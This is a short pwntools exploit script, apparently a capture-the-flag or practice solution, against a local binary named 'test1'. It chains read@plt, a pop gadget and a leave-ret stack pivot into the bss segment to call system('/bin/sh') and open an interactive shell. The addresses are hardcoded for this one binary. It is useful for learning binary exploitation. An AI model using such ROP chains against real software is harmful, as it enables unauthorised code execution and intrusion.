from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
p = process("./test1")
if args.G:
    gdb.attach(p)

bin_sh_addr = 0x80495d0
system_plt = 0x8048370
read_plt = 0x8048340
leave_ret = 0x80484d5
pop3_ret = 0x080485a9
gadgets = 0x8048549
bss = 0x804a560

payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss) + p32(100) 
payload += p32(gadgets) + p32(bss + 4)
p.recvuntil("Hello,tell me your story:\n")
p.sendline(payload)

payload1 = b"b"*10 + p32(0x804a060 + 4)
p.recvuntil("By the way, what's your name:\n")
p.sendline(payload1)

sleep(1)
payload2 = p32(system_plt) + b"aaaa" + p32(bin_sh_addr) 
p.sendline(payload2)
p.interactive()
